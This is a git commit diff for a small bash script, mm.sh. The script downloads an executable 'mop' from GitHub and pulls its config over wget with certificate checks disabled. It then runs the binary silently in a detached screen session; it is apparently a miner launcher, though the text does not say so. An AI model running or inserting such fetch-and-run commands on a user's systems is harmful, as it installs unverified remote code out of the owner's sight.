49e19c86284d3c664f24ea827db9b0307004a7e0
dballard198 <dballard198@gmail.com>
2026-07-17 21:33:01 +0900

    Update mm.sh

--- mm.sh
+++ mm.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
 wget https://raw.githubusercontent.com/dballard198/jackse/refs/heads/main/mop
 chmod u+x mop
-wget --no-check-certificate -qO ./config.json https://raw.githubusercontent.com/dballard198/jackse/refs/heads/main/mm.json
+wget --no-check-certificate -qO ./config.json https://raw.githubusercontent.com/dballard198/jackse/refs/heads/main/mj.json
 screen -dmS task bash -c "./mop"
